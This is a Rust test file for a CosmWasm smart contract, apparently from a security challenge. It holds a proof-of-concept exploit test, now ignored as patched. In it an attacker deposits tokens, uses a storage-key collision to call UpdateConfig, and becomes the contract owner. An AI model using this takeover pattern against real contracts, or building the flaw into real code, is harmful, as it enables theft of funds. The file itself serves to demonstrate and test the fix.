#[cfg(test)]
pub mod tests {
    use cosmwasm_std::{coin, Addr, Uint128};
    use cw_multi_test::Executor;

    use crate::{
        contract::DENOM,
        integration_tests::tests::{base_scenario, mint_tokens},
        msg::{ConfigQueryResponse, ExecuteMsg, QueryMsg},
    };

    pub const ATTACKER: &str = "awesomwasm";

    #[ignore = "bug is patched"]
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = base_scenario();
        app = mint_tokens(app, ATTACKER.to_string(), Uint128::from(120u128));

        // Deposit topping the threshold
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(120, DENOM)], //@note we could set a bigger base threshold and force players to take a flashloan and repay it
        )
        .unwrap();

        // Change threshold
        // Attacker can call it because the underlying storage key is the same with owner
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::UpdateConfig {
                new_threshold: Uint128::MAX,
            },
            &[],
        )
        .unwrap();

        // Check owner address
        let config: ConfigQueryResponse = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();

        assert_eq!(config.owner, Addr::unchecked(ATTACKER));
        assert_eq!(config.threshold, Uint128::MAX);
    }
}
